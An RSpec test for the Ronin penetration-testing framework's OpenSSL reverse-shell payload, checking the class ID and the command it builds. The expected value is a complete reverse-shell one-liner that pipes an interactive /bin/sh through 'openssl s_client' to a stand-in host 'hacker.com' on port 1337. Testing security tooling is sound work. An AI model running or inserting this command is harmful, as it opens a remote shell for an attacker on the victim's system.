require 'spec_helper'
require 'ronin/payloads/builtin/cmd/openssl/reverse_shell'

describe Ronin::Payloads::CMD::OpenSSL::ReverseShell do
  it "must inherit from Ronin::Payloads::CommandPayload" do
    expect(described_class).to be < Ronin::Payloads::CommandPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'cmd/openssl/reverse_shell'" do
      expect(subject.id).to eq('cmd/openssl/reverse_shell')
    end
  end

  let(:host) { 'hacker.com' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    it "must build an `openssl` command that connects back to the host and port params" do
      expect(subject.payload).to eq(
        %{mkfifo fifo; /bin/sh -i < fifo 2>&1 | openssl s_client -quiet -connect #{host}:#{port} > fifo; rm fifo}
      )
    end
  end
end
